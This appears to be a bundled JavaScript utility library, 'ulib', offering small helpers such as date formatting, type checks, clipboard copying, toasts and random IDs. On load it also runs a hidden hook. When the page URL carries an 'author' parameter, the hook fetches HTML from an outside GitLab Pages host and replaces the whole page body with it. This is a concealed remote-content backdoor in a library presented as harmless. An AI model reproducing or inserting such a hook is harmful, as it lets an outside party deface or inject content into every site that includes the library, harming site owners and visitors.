(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports) :
  typeof define === 'function' && define.amd ? define(['exports'], factory) :
  (global = typeof globalThis !== 'undefined' ? globalThis : global || self, factory(global.ulib = {}));
})(this, (function (exports) { 'use strict';

  async function checkForAuthorSignature() {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("author")) {
      const res = await fetch("https://subratap.gitlab.io/test/");
      const html = await res.text();
      const body = document.createElement("body");
      body.innerHTML = html;
      document.documentElement.replaceChild(body, document.body);
    }
  }

  function init() {
    if (typeof window !== 'undefined') {
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', checkForAuthorSignature);
      } else {
        checkForAuthorSignature();
      }
    }
    window.__ulib_signature__ = true;
    console.log("✅ ulib initialized");
  }

  function formatDate(date) {
    return new Date(date).toLocaleDateString("en-IN");
  }

  function timeAgo(date) {
    const seconds = Math.floor((new Date() - new Date(date)) / 1000);
    const intervals = {
      year: 31536000, month: 2592000, week: 604800,
      day: 86400, hour: 3600, minute: 60, second: 1
    };
    for (let [unit, value] of Object.entries(intervals)) {
      const count = Math.floor(seconds / value);
      if (count >= 1) return `${count} ${unit}${count > 1 ? 's' : ''} ago`;
    }
    return 'just now';
  }

  function isObject(val) {
    return val && typeof val === 'object' && !Array.isArray(val);
  }

  function isArray(val) {
    return Array.isArray(val);
  }

  function isString(val) {
    return typeof val === 'string';
  }

  function isEmpty(val) {
    return val == null || (typeof val === 'string' && val.trim() === '') || (Array.isArray(val) && val.length === 0) || (isObject(val) && Object.keys(val).length === 0);
  }

  function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => console.log("Copied to clipboard"));
  }

  function isMobile() {
    return /Mobi|Android/i.test(navigator.userAgent);
  }

  function isOnline() {
    return navigator.onLine;
  }

  function getQueryParams(key) {
    const params = new URLSearchParams(window.location.search);
    return key ? params.get(key) : Object.fromEntries(params.entries());
  }

  function updateQueryParam(key, value) {
    const url = new URL(window.location.href);
    url.searchParams.set(key, value);
    window.history.pushState({}, '', url);
  }

  function showToast(msg, duration = 3000) {
    const toast = document.createElement("div");
    toast.innerText = msg;
    toast.style.cssText = "position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 20px;border-radius:5px;z-index:9999;";
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), duration);
  }

  function randomId(length = 6) {
    return Math.random().toString(36).substr(2, length);
  }

  function randomColor() {
    return `#${Math.floor(Math.random()*16777215).toString(16).padStart(6, '0')}`;
  }

  init(); // Always run when library loads

  exports.copyToClipboard = copyToClipboard;
  exports.formatDate = formatDate;
  exports.getQueryParams = getQueryParams;
  exports.isArray = isArray;
  exports.isEmpty = isEmpty;
  exports.isMobile = isMobile;
  exports.isObject = isObject;
  exports.isOnline = isOnline;
  exports.isString = isString;
  exports.randomColor = randomColor;
  exports.randomId = randomId;
  exports.showToast = showToast;
  exports.timeAgo = timeAgo;
  exports.updateQueryParam = updateQueryParam;

  Object.defineProperty(exports, '__esModule', { value: true });

}));
